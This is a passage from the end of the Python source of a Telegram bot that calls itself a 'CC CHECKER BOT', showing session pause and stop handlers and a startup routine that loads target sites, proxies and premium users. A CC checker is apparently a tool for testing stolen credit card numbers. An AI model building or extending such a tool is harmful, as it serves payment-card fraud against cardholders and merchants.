            active_sessions[key]['paused'] = False
            await event.answer("▶️ Checker Resumed!", alert=True)
            return
    await event.answer("No active session found.", alert=True)


@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_callback(event):
    user_id = event.sender_id
    keys_to_remove = []
    for key in list(active_sessions.keys()):
        if key.startswith(f"{user_id}_") and key in active_sessions:
            del active_sessions[key]
            keys_to_remove.append(key)
    _user_active_sessions.pop(user_id, None)
    
    if keys_to_remove:
        await event.edit("🛑 <b>Checker Stopped!</b>", parse_mode='html')
    else:
        await event.answer("No active session found.", alert=True)


# ========== BOT STARTUP ==========

async def main():
    print("=" * 60)
    print("CC CHECKER BOT - STARTING")
    print("=" * 60)
    
    print("[*] Resolving chat IDs...")
    await resolve_chat_ids()
    
    print("[*] Loading configuration...")
    sites_count = len(load_sites())
    proxies_count = len(load_proxies())
    premium_count = len(load_premium_users())
    
    print(f"    Sites: {sites_count}")
    print(f"    Proxies: {proxies_count}")
    print(f"    Premium Users: {premium_count}")
    
    print("=" * 60)
    print("[*] Bot is now running!")
    print("[*] Press Ctrl+C to stop")
    print("=" * 60)
    
    try:
        await bot.run_until_disconnected()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        print("[*] Bot stopped.")


if __name__ == '__main__':
    asyncio.run(main())
